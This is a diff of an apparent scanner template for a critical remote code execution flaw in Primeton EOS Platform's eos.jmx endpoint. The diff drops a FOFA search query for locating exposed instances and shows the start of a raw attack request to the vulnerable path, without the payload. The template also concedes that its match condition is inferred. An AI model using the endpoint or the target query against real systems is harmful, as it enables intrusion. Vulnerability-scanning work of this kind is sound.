@@ -3,14 +3,8 @@ info:
   name: 普元EOS Platform-eos.jmx存在远程代码执行漏洞
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ye3gmi1etoi8fffx
-
-    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: rce,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: ye3gmi1etoi8fffx
-    fofa: body="普元" || (body="ame.primeton.com" && body="eos-web")
 http:
 - raw:
   - 'POST /workspace/frame/permission/common/eos.jmx HTTP/1.1
